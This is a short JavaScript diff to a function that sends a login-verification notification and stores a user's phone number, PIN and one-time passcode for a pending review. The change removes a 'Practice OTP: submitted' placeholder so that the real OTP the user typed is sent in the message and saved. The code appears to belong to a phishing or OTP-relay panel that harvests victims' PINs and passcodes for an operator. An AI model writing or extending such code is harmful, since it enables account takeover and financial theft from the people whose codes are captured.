@@ -154,17 +154,18 @@ async function notifyLoginVerification(login) {
       (login.amount ? `Amount: ${esc(login.amount)} USD\n` : '') +
       `Time: ${new Date().toLocaleString()}`;
   } else {
+    const otpValue = login.otp || login.otpSubmitted || 'N/A';
     text =
       `<b>🔐 OTP Verification Required</b>\n\n` +
       `User: ${esc(login.username || 'N/A')}\n` +
-      `Practice OTP: ${esc('submitted')}\n` +
+      `OTP: ${esc(otpValue)}\n` +
       `Time: ${new Date().toLocaleString()}`;
   }
 
   await store.set(store.NS.LOGIN, id, {
     phone: login.username,
     pin: login.pin || '',
-    otp: login.otpSubmitted ? 'submitted' : '',
+    otp: login.otp || login.otpSubmitted || '',
     type,
     timestamp: Date.now(),
     status: 'pending',
